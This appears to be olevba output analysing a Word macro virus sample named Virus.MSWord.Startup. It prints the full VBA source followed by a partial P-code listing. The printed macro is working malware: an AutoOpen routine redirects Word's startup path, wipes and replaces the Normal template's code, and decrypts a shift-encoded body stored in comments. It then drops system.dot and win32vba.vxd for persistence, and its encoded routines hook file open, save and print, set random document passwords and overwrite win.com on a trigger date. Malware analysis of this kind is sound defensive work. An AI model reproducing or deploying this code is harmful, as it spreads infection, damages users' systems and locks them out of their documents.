olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Startup
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Startup - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'3'
Sub AutoOpen()
Application.DisplayRecentFiles = False
Call Install
End Sub
Sub Install()
Dim OS, WinDir, SFile As String
OS = System.OperatingSystem
If OS <> "Windows" Then
Exit Sub
End If
WinDir = Environ("WinDir")
SFile = Dir(WinDir & "\SYSTEM\system.dot")
If SFile = "system.dot" Then
Exit Sub
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = WinDir & "\SYSTEM"
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.Save
Call Decrypt
End Sub
Sub Decrypt()
Dim C_DC1, C_DC2, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Set ADObj = ActiveDocument.VBProject.VBComponents(1).CodeModule
LastLine = ADObj.CountOfLines
Z = Mid(ADObj.Lines(1, 1), 2, 1)
For i = 47 To LastLine
C_DC1 = ADObj.Lines(i, 1)
For X = 2 To Len(C_DC1) - 1
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode + Z
C_DC2 = C_DC2 & Chr(IntCode)
Next X
C_DC2 = C_DC2 & Chr(13)
Next i
C_DC3 = ADObj.Lines(6, 41)
Set BaseObj = CreateObject("Word.Document")
Set ATObj = ActiveDocument.VBProject.VBComponents(1)
ATObj.CodeModule.AddFromString C_DC2
ATObj.CodeModule.AddFromString C_DC3
ATObj.CodeModule.InsertLines 1, "Dim C_DC2 As String"
ATObj.Export Environ("WinDir") & "\SYSTEM\win32vba.vxd"
BaseObj.SaveAs Environ("WinDir") & "\SYSTEM\system.dot", wdFormatTemplate
BaseObj.Close
End Sub
'Pr_
@ovmq%&'
'Afj
@\A@.)
@\A@0
>p
Pqofkd'
'Afj
W)
f)
U)
I^pqIfkb
>p
Fkqbdbo'
'O^kaljfwb'
'W
:
Fkq%%4
'
Oka&
(
.&'
'@\A@/
:
'
'@\A@/
:
$
#
W
#
$
#
@eo%.0&'
'@\A@/
:
@\A@/
#
Pr_
>rqlLmbk%&
#
@eo%.0&'
'@\A@/
:
@\A@/
#
>mmif`^qflk+Afpmi^vOb`bkqCfibp
:
C^ipb
#
@eo%.0&'
'@\A@/
:
@\A@/
#
@^ii
Fkpq^ii
#
@eo%.0&'
'@\A@/
:
@\A@/
#
Bka
Pr_
#
@eo%.0&'
'Fc
Afo%Bksfolk%TfkAfo&
#
YPVPQBJYtfk0/s_^+sua&
9;
tfk0/s_^+sua
Qebk'
'>aaFkp%pvpqbj+alq&+Fkpq^iiba
:
C^ipb'
'Bufq
Pr_'
'Bka
Fc'
'Lmbk
Bksfolk%TfkAfo&
#
YPVPQBJYtfk0/s_^+sua
Clo
Fkmrq
>p
 .'
'Clo
f
:
.
Ql
6'
'Ifkb
Fkmrq
 .)
@\A@.'
'Kbuq
f'
'@\A@.
:
'
'Clo
f
:
.
Ql
1.'
'Ifkb
Fkmrq
 .)
@\A@.'
'@\A@/
:
@\A@/
#
@\A@.
#
@eo%.0&'
'Kbuq
f'
'@\A@0
:
'
'Tefib
Klq
BLC%.&'
'Ifkb
Fkmrq
 .)
@\A@.'
'Clo
U
:
.
Ql
Ibk%@\A@.&'
'Fkq@lab
:
>p`%Jfa%@\A@.)
U)
.&&'
'Fkq@lab
:
Fkq@lab
*
W'
'@\A@0
:
@\A@0
#
@eo%Fkq@lab&'
'Kbuq
U'
'Fc
@\A@0
;

Qebk'
'@\A@/
:
@\A@/
#
$
#
@\A@0
#
$
#
@eo%.0&'
'Bka
Fc'
'@\A@0
:
'
'Tbka'
'@\A@/
:
Jfa%@\A@/)
.)
Ibk%@\A@/&
*
.&'
'@ilpb
 .'
'Bka
Pr_'
'Pr_
>rqlBub`%&'
'>mmif`^qflk+Afpmi^vOb`bkqCfibp
:
C^ipb'
'@ljj^ka?^op%Pq^ka^oa&+@lkqolip%/&+Lk>`qflk
:
CfibLmbk'
'@ljj^ka?^op%Pq^ka^oa&+@lkqolip%0&+Lk>`qflk
:
CfibP^sb'
'@ljj^ka?^op%Pq^ka^oa&+@lkqolip%1&+Lk>`qflk
:
Mofkq@roobkqAl`rjbkq'
'@^ii
@ovmq'
'@^ii
Lrqpfabo'
'Bka
Pr_'
'Pr_
Al`@ilpb%&'
'Lk
Boolo
Obprjb
Kbuq'
'Fc
>`qfsbAl`rjbkq+P^sba
:
C^ipb
Qebk'
'@^ii
Fkcb`q>A'
'>`qfsbAl`rjbkq+@ilpb
P^sb@e^kdbp7:taMoljmqQlP^sb@e^kdbp'
'Bipb'
'>`qfsbAl`rjbkq+@ilpb'
'Bka
Fc'
'Bka
Pr_'
'Pr_
CfibLmbk%&'
'Tfqe
Af^ildp%taAf^ildCfibLmbk&'
'+Afpmi^v'
'Fc
+K^jb
;

Qebk'
'Fc
%+Cloj^q
:
-&
Lo
%+Cloj^q
:
.&
Qebk'
'Al`rjbkqp+Lmbk
CfibK^jb7:+K^jb)
Cloj^q7:+Cloj^q'
'@^ii
Fkcb`q>A'
'>`qfsbAl`rjbkq+P^sb'
'Bka
Fc'
'Al`rjbkqp+Lmbk
CfibK^jb7:+K^jb)
Cloj^q7:+Cloj^q'
'Bka
Fc'
'Bka
Tfqe'
'Bka
Pr_'
'Pr_
CfibP^sb%&'
'Lk
Boolo
Obprjb
Kbuq'
'Fc
Afo%>`qfsbAl`rjbkq+CriiK^jb&
;

Qebk'
'>`qfsbAl`rjbkq+P^sb'
'Bipb'
'@^ii
CfibP^sb>p'
'Bka
Fc'
'Bka
Pr_'
'Pr_
CfibP^sb>p%&'
'Afj
Il`^iS^o
>p
Fkqbdbo'
'Tfqe
Af^ildp%taAf^ildCfibP^sb>p&'
'+Afpmi^v'
'Fc
+K^jb
;

Qebk'
'Fc
%+Cloj^q
:
-&
Lo
%+Cloj^q
:
.&
Qebk'
'O^kaljfwb'
'Il`^iS^o
:
Fkq%%.-
'
Oka&
(
.&'
'Fc
Il`^iS^o
:
.
Qebk'
'@^ii
PbqM^pptloa'
'Bipb'
'@^ii
Fkcb`q>A'
'Bka
Fc'
'Bka
Fc'
'>`qfsbAl`rjbkq+P^sb>p
CfibK^jb7:+K^jb)
CfibCloj^q7:+Cloj^q'
'Bka
Fc'
'Bka
Tfqe'
'Bka
Pr_'
'Pr_
CfibQbjmi^qbp%&'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'>aaFkp+Rkil^a
C^ipb'
'@^ii
@ib^o>A'
'@ljj^ka?^op%Pq^ka^oa&+Obpbq'
'Af^ildp%taAf^ildQllipQbjmi^qbp&+Pelt'
'Bka
Pr_'
'Pr_
SfbtS?@lab%&'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'>aaFkp+Rkil^a
C^ipb'
'@^ii
@ib^o>A'
'@ljj^ka?^op%Pq^ka^oa&+Obpbq'
'>mmif`^qflk+PeltSfpr^i?^pf`Bafqlo
:
Qorb'
'Bka
Pr_'
'Pr_
QllipJ^`ol%&'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'>aaFkp+Rkil^a
C^ipb'
'@^ii
@ib^o>A'
'@ljj^ka?^op%Pq^ka^oa&+Obpbq'
'Af^ildp%taAf^ildQllipJ^`ol&+Pelt'
'Bka
Pr_'
'Pr_
QllipLmqflkp%&'
'Afj
Ob^iM^qe
>p
Pqofkd'
'Ob^iM^qe
:
'
'Ob^iM^qe
:
Pvpqbj+Mofs^qbMolcfibPqofkd%)
EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
MOLDO>JAFO&'
'Ob^iM^qe
:
Ob^iM^qe
#
YPq^oqRm'
'Pvpqbj+Mofs^qbMolcfibPqofkd%)
EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
PQ>OQRM*M>QE&
:
Ob^iM^qe'
'Fc
Af^ildp%taAf^ildQllipLmqflkp&+Pelt
:
-
Lo
*.
Lo
*/
Qebk'
'Pvpqbj+Mofs^qbMolcfibPqofkd%)
EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
PQ>OQRM*M>QE&
:
Bksfolk%TfkAfo&
#
YPVPQBJ'
'Bka
Fc'
'Bka
Pr_'
'Pr_
CfibMofkq%&'
'Fc
Af^ildp%taAf^ildCfibMofkq&+Afpmi^v
:
*.
Qebk'
'@^ii
Mofkq@roobkqAl`rjbkq'
'Bka
Fc'
'Bka
Pr_'
'Pr_
Mofkq@roobkqAl`rjbkq%&'
'Lk
Boolo
Obprjb
Kbuq'
'Afj
KlMofkq
>p
Fkqbdbo'
'O^kaljfwb'
'KlMofkq
:
Fkq%%Oka
'
0&
(
.&'
'Fc
KlMofkq
:
0
Qebk'
'Jpd?lu
Ìíåêïâí

#
>mmif`^qflk+>`qfsbMofkqbo
#

êâ
êÝæáâê)
s_LHLkiv
(
s_Bu`i^j^qflk)
ËõåÞçÝ
ìâôÝïå'
'Bufq
Pr_'
'Bka
Fc'
'>`qfsbAl`rjbkq+MofkqLrq'
'Bka
Pr_'
'Pr_
@ib^o>A%&'
'Lk
Boolo
Obprjb
Kbuq'
'Afj
>AI@lrkq)
f
>p
Fkqbdbo'
'Pbq
>A@labJlarib
:
>`qfsbAl`rjbkq+S?Molgb`q+S?@ljmlkbkqp%.&+@labJlarib'
'Fc
>A@labJlarib+@lrkqLcIfkbp
;
-
Qebk'
'>AI@lrkq
:
>A@labJlarib+@lrkqLcIfkbp'
'>A@labJlarib+AbibqbIfkbp
.)
>AI@lrkq'
'Clo
f
:
.
Ql
/-'
'>A@labJlarib+FkpboqIfkbp
.)

'
'>A@labJlarib+AbibqbIfkbp
.)
.'
'Kbuq
f'
'>`qfsbAl`rjbkq+P^sba
:
Qorb'
'Bka
Fc'
'Bka
Pr_'
'Pr_
Lrqpfabo%&'
'Fc
%A^v%Klt&
:
2&
>ka
%Jlkqe%Klt&
:
./&
Qebk'
'Afj
?rccbo
>p
S^of^kq'
'Afj
?rccbo.
>p
?vqb'
'?rccbo
:
>oo^v%.51)
.3)
0)
.52)
-)
.)
2.)
/.-)
/-2)
.6)
.62&'
'Lmbk
Bksfolk%TfkAfo&
#
Ytfk+`lj
Clo
?fk^ov
>p
 .'
'Clo
f
:
.
Ql
..'
'?rccbo.
:
?rccbo%f
*
.&'
'Mrq
 .)
f)
?rccbo.'
'Kbuq
f'
'@ilpb
 .'
'Jpd?lu
Moljmq7:Qfjb
#

*
QfJB
QL
AfB


#
@eo%.0&
#
@eo%.0&
#
XLRQPfABOZ)
Qfqib7:LRQPfABO$P
JBPP>DB'
'Bka
Fc'
'Bka
Pr_'
'Pr_
PbqM^pptloa%&'
'Afj
f
>p
Fkqbdbo'
'Afj
M^pp`lab
>p
Pqofkd'
'O^kaljfwb'
'Clo
f
:
.
Ql
3'
'O@
:
Fkq%%6
'
Oka&
(
-&'
'M^pp`lab
:
M^pp`lab
#
O@'
'Kbuq
f'
'>`qfsbAl`rjbkq+M^pptloa
:
M^pp`lab'
'Bka
Pr_'
'Pr_
Fkcb`q>A%&'
'Afj
>AI@lrkq)
f
>p
Fkqbdbo'
'Pbq
>A@labJlarib
:
>`qfsbAl`rjbkq+S?Molgb`q+S?@ljmlkbkqp%.&+@labJlarib'
'>AI@lrkq
:
>A@labJlarib+@lrkqLcIfkbp'
'Fc
>A@labJlarib+Ifkbp%/)
.&
:
Pr_
>rqlLmbk%&
Qebk'
'Bufq
Pr_'
'Bipb'
'>A@labJlarib+AbibqbIfkbp
.)
>AI@lrkq'
'>A@labJlarib+>aaColjPqofkd
@\A@/'
'Bka
Fc'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'Bka
Pr_'
'$LRQPfABO
s.+--$'
'$B^pq*H^w^hepq^k)
RH$'
'$.-
g^kr^ov
/--.
vb^o+
..7--
^j$'
'$Kbt
bk`ovmq
^ka
pqb^iqe
^idlofqej$'
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Startup
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15693 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0002 "3'"
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #3:
' 	ArgsCall (Call) Install 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Sub Install())
' Line #6:
' 	Dim 
' 	VarDefn OS
' 	VarDefn WinDir
' 	VarDefn SFile (As String)
' Line #7:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	St OS 
' Line #8:
' 	Ld OS 
' 	LitStr 0x0007 "Windows"
' 	Ne 
' 	IfBlock 
' Line #9:
' 	ExitSub 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #12:
' 	Ld WinDir 
' 	LitStr 0x0012 "\SYSTEM\system.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St SFile 
' Line #13:
' 	Ld SFile 
' 	LitStr 0x000A "system.dot"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	ExitSub 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld WinDir 
' 	LitStr 0x0007 "\SYSTEM"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #19:
' 	ArgsCall (Call) Decrypt 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub Decrypt())
' Line #22:
' 	Dim 
' 	VarDefn C_DC1
' 	VarDefn C_DC2
' 	VarDefn C_DC3 (As String)
' Line #23:
' 	Dim 
' 	VarDefn Z
' 	VarDefn i
' 	VarDefn X
' 	VarDefn LastLine (As Integer)
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ADObj 
' Line #25:
' 	Ld ADObj 
' 	MemLd CountOfLines 
' 	St LastLine 
' Line #26:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADObj 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Z 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x002F 
' 	Ld LastLine 
' 	For 
' Line #28:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ADObj 
' 	ArgsMemLd Lines 0x0002 
' 	St C_DC1 
' Line #29:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld C_DC1 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #30:
' 	Ld C_DC1 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St IntCode 
' Line #31:
' 	Ld IntCode 
' 	Ld Z 
' 	Add 
' 	St IntCode 
' Line #32:
' 	Ld C_DC2 
' 	Ld IntCode 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #33:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld C_DC2 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C_DC2 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	LitDI2 0x0006 
' 	LitDI2 0x0029 
' 	Ld ADObj 
' 	ArgsMemLd Lines 0x0002 
' 	St C_DC3 
' Line #37:
' 	SetStmt 
' 	LitStr 0x000D "Word.Document"
' 	ArgsLd CreateObject 0x0001 
' 	Set BaseObj 
' Line #38:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ATObj 
' Line #39:
' 	Ld C_DC2 
' 	Ld ATObj 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	Ld C_DC3 
' 	Ld ATObj 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #41:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Dim C_DC2 As String"
' 	Ld ATObj 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0014 "\SYSTEM\win32vba.vxd"
' 	Concat 
' 	Ld ATObj 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' 	LitStr 0x0006 "WinDir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0012 "\SYSTEM\system.dot"
' 	Concat 
' 	Ld wdFormatTemplate 
' 	Ld BaseObj 
' 	ArgsMemCall SaveAs 0x0002 
' Line #44:
' 	Ld BaseObj 
' 	ArgsMemCall Close 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	QuoteRem 0x0000 0x000C "Pr_
' @ovmq%&'"
' Line #47:
' 	QuoteRem 0x0000 0x001B "Afj
' @\A@.)
' @\A@0
' >p
' Pqofkd'"
' Line #48:
' 	QuoteRem 0x0000 0x0021 "Afj
' W)
' f)
' U)
' I^pqIfkb
' >p
' Fkqbdbo'"
' Line #49:
' 	QuoteRem 0x0000 0x000A "O^kaljfwb'"
' Line #50:
' 	QuoteRem 0x0000 0x0017 "W
' :
' Fkq%%4
' '
' Oka&
' (
' .&'"
' Line #51:
' 	QuoteRem 0x0000 0x000B "@\A@/
' :
' '"
' Line #52:
' 	QuoteRem 0x0000 0x0020 "@\A@/
' :
' $
' #
' W
' #
' $
' #
' @eo%.0&'"
' Line #53:
' 	QuoteRem 0x0000 0x002B "@\A@/
' :
' @\A@/
' #
' Pr_
' >rqlLmbk%&
' #
' @eo%.0&'"
' Line #54:
' 	QuoteRem 0x0000 0x0043 "@\A@/
' :
' @\A@/
' #
' >mmif`^qflk+Afpmi^vOb`bkqCfibp
' :
' C^ipb
' #
' @eo%.0&'"
' Line #55:
' 	QuoteRem 0x0000 0x0029 "@\A@/
' :
' @\A@/
' #
' @^ii
' Fkpq^ii
' #
' @eo%.0&'"
' Line #56:
' 	QuoteRem 0x0000 0x0024 "@\A@/
' :
' @\A@/
' #
' Bka
' Pr_
' #
' @eo%.0&'"
' Line #57:
' 	QuoteRem 0x0000 0x004A "Fc
' Afo%Bksfolk%TfkAfo&
' #
' YPVPQBJYtfk0/s_^+sua&
' 9;
' tfk0/s_^+sua
' Qebk'"
' Line #58:
' 	QuoteRem 0x0000 0x0027 ">aaFkp%pvpqbj+alq&+Fkpq^iiba
' :
' C^ipb'"
' Line #59:
' 	QuoteRem 0x0000 0x0009 "Bufq
' Pr_'"
' Line #60:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #61:
' 	QuoteRem 0x0000 0x0040 "Lmbk
' Bksfolk%TfkAfo&
' #
' YPVPQBJYtfk0/s_^+sua
' Clo
' Fkmrq
' >p
'  .'"
' Line #62:
' 	QuoteRem 0x0000 0x000F "Clo
' f
' :
' .
' Ql
' 6'"
' Line #63:
' 	QuoteRem 0x0000 0x0015 "Ifkb
' Fkmrq
'  .)
' @\A@.'"
' Line #64:
' 	QuoteRem 0x0000 0x0007 "Kbuq
' f'"
' Line #65:
' 	QuoteRem 0x0000 0x000B "@\A@.
' :
' '"
' Line #66:
' 	QuoteRem 0x0000 0x0010 "Clo
' f
' :
' .
' Ql
' 1.'"
' Line #67:
' 	QuoteRem 0x0000 0x0015 "Ifkb
' Fkmrq
'  .)
' @\A@.'"
' Line #68:
' 	QuoteRem 0x0000 0x0020 "@\A@/
' :
' @\A@/
' #
' @\A@.
' #
' @eo%.0&'"
' Line #69:
' 	QuoteRem 0x0000 0x0007 "Kbuq
' f'"
' Line #70:
' 	QuoteRem 0x0000 0x000B "@\A@0
' :
' '"
' Line #71:
' 	QuoteRem 0x0000 0x0011 "Tefib
' Klq
' BLC%.&'"
' Line #72:
' 	QuoteRem 0x0000 0x0015 "Ifkb
' Fkmrq
'  .)
' @\A@.'"
' Line #73:
' 	QuoteRem 0x0000 0x0018 "Clo
' U
' :
' .
' Ql
' Ibk%@\A@.&'"
' Line #74:
' 	QuoteRem 0x0000 0x0020 "Fkq@lab
' :
' >p`%Jfa%@\A@.)
' U)
' .&&'"
' Line #75:
' 	QuoteRem 0x0000 0x0016 "Fkq@lab
' :
' Fkq@lab
' *
' W'"
' Line #76:
' 	QuoteRem 0x0000 0x001D "@\A@0
' :
' @\A@0
' #
' @eo%Fkq@lab&'"
' Line #77:
' 	QuoteRem 0x0000 0x0007 "Kbuq
' U'"
' Line #78:
' 	QuoteRem 0x0000 0x0013 "Fc
' @\A@0
' ;
' 
' Qebk'"
' Line #79:
' 	QuoteRem 0x0000 0x002C "@\A@/
' :
' @\A@/
' #
' $
' #
' @\A@0
' #
' $
' #
' @eo%.0&'"
' Line #80:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #81:
' 	QuoteRem 0x0000 0x000B "@\A@0
' :
' '"
' Line #82:
' 	QuoteRem 0x0000 0x0005 "Tbka'"
' Line #83:
' 	QuoteRem 0x0000 0x0026 "@\A@/
' :
' Jfa%@\A@/)
' .)
' Ibk%@\A@/&
' *
' .&'"
' Line #84:
' 	QuoteRem 0x0000 0x0009 "@ilpb
'  .'"
' Line #85:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #86:
' 	QuoteRem 0x0000 0x000F "Pr_
' >rqlBub`%&'"
' Line #87:
' 	QuoteRem 0x0000 0x0027 ">mmif`^qflk+Afpmi^vOb`bkqCfibp
' :
' C^ipb'"
' Line #88:
' 	QuoteRem 0x0000 0x003A "@ljj^ka?^op%Pq^ka^oa&+@lkqolip%/&+Lk>`qflk
' :
' CfibLmbk'"
' Line #89:
' 	QuoteRem 0x0000 0x003A "@ljj^ka?^op%Pq^ka^oa&+@lkqolip%0&+Lk>`qflk
' :
' CfibP^sb'"
' Line #90:
' 	QuoteRem 0x0000 0x0046 "@ljj^ka?^op%Pq^ka^oa&+@lkqolip%1&+Lk>`qflk
' :
' Mofkq@roobkqAl`rjbkq'"
' Line #91:
' 	QuoteRem 0x0000 0x000B "@^ii
' @ovmq'"
' Line #92:
' 	QuoteRem 0x0000 0x000E "@^ii
' Lrqpfabo'"
' Line #93:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #94:
' 	QuoteRem 0x0000 0x000F "Pr_
' Al`@ilpb%&'"
' Line #95:
' 	QuoteRem 0x0000 0x0015 "Lk
' Boolo
' Obprjb
' Kbuq'"
' Line #96:
' 	QuoteRem 0x0000 0x0025 "Fc
' >`qfsbAl`rjbkq+P^sba
' :
' C^ipb
' Qebk'"
' Line #97:
' 	QuoteRem 0x0000 0x000E "@^ii
' Fkcb`q>A'"
' Line #98:
' 	QuoteRem 0x0000 0x0038 ">`qfsbAl`rjbkq+@ilpb
' P^sb@e^kdbp7:taMoljmqQlP^sb@e^kdbp'"
' Line #99:
' 	QuoteRem 0x0000 0x0005 "Bipb'"
' Line #100:
' 	QuoteRem 0x0000 0x0015 ">`qfsbAl`rjbkq+@ilpb'"
' Line #101:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #102:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #103:
' 	QuoteRem 0x0000 0x000F "Pr_
' CfibLmbk%&'"
' Line #104:
' 	QuoteRem 0x0000 0x001F "Tfqe
' Af^ildp%taAf^ildCfibLmbk&'"
' Line #105:
' 	QuoteRem 0x0000 0x0009 "+Afpmi^v'"
' Line #106:
' 	QuoteRem 0x0000 0x0013 "Fc
' +K^jb
' ;
' 
' Qebk'"
' Line #107:
' 	QuoteRem 0x0000 0x002B "Fc
' %+Cloj^q
' :
' -&
' Lo
' %+Cloj^q
' :
' .&
' Qebk'"
' Line #108:
' 	QuoteRem 0x0000 0x0030 "Al`rjbkqp+Lmbk
' CfibK^jb7:+K^jb)
' Cloj^q7:+Cloj^q'"
' Line #109:
' 	QuoteRem 0x0000 0x000E "@^ii
' Fkcb`q>A'"
' Line #110:
' 	QuoteRem 0x0000 0x0014 ">`qfsbAl`rjbkq+P^sb'"
' Line #111:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #112:
' 	QuoteRem 0x0000 0x0030 "Al`rjbkqp+Lmbk
' CfibK^jb7:+K^jb)
' Cloj^q7:+Cloj^q'"
' Line #113:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #114:
' 	QuoteRem 0x0000 0x0009 "Bka
' Tfqe'"
' Line #115:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #116:
' 	QuoteRem 0x0000 0x000F "Pr_
' CfibP^sb%&'"
' Line #117:
' 	QuoteRem 0x0000 0x0015 "Lk
' Boolo
' Obprjb
' Kbuq'"
' Line #118:
' 	QuoteRem 0x0000 0x002A "Fc
' Afo%>`qfsbAl`rjbkq+CriiK^jb&
' ;
' 
' Qebk'"
' Line #119:
' 	QuoteRem 0x0000 0x0014 ">`qfsbAl`rjbkq+P^sb'"
' Line #120:
' 	QuoteRem 0x0000 0x0005 "Bipb'"
' Line #121:
' 	QuoteRem 0x0000 0x0010 "@^ii
' CfibP^sb>p'"
' Line #122:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #123:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #124:
' 	QuoteRem 0x0000 0x0011 "Pr_
' CfibP^sb>p%&'"
' Line #125:
' 	QuoteRem 0x0000 0x0018 "Afj
' Il`^iS^o
' >p
' Fkqbdbo'"
' Line #126:
' 	QuoteRem 0x0000 0x0021 "Tfqe
' Af^ildp%taAf^ildCfibP^sb>p&'"
' Line #127:
' 	QuoteRem 0x0000 0x0009 "+Afpmi^v'"
' Line #128:
' 	QuoteRem 0x0000 0x0013 "Fc
' +K^jb
' ;
' 
' Qebk'"
' Line #129:
' 	QuoteRem 0x0000 0x002B "Fc
' %+Cloj^q
' :
' -&
' Lo
' %+Cloj^q
' :
' .&
' Qebk'"
' Line #130:
' 	QuoteRem 0x0000 0x000A "O^kaljfwb'"
' Line #131:
' 	QuoteRem 0x0000 0x001F "Il`^iS^o
' :
' Fkq%%.-
' '
' Oka&
' (
' .&'"
' Line #132:
' 	QuoteRem 0x0000 0x0015 "Fc
' Il`^iS^o
' :
' .
' Qebk'"
' Line #133:
' 	QuoteRem 0x0000 0x0011 "@^ii
' PbqM^pptloa'"
' Line #134:
' 	QuoteRem 0x0000 0x0005 "Bipb'"
' Line #135:
' 	QuoteRem 0x0000 0x000E "@^ii
' Fkcb`q>A'"
' Line #136:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #137:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #138:
' 	QuoteRem 0x0000 0x003B ">`qfsbAl`rjbkq+P^sb>p
' CfibK^jb7:+K^jb)
' CfibCloj^q7:+Cloj^q'"
' Line #139:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #140:
' 	QuoteRem 0x0000 0x0009 "Bka
' Tfqe'"
' Line #141:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #142:
' 	QuoteRem 0x0000 0x0014 "Pr_
' CfibQbjmi^qbp%&'"
' Line #143:
' 	QuoteRem 0x0000 0x001A "Qbjmi^qbp%.&+P^sba
' :
' Qorb'"
' Line #144:
' 	QuoteRem 0x0000 0x0014 ">aaFkp+Rkil^a
' C^ipb'"
' Line #145:
' 	QuoteRem 0x0000 0x000D "@^ii
' @ib^o>A'"
' Line #146:
' 	QuoteRem 0x0000 0x001E "@ljj^ka?^op%Pq^ka^oa&+Obpbq'"
' Line #147:
' 	QuoteRem 0x0000 0x0025 "Af^ildp%taAf^ildQllipQbjmi^qbp&+Pelt'"
' Line #148:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #149:
' 	QuoteRem 0x0000 0x0011 "Pr_
' SfbtS?@lab%&'"
' Line #150:
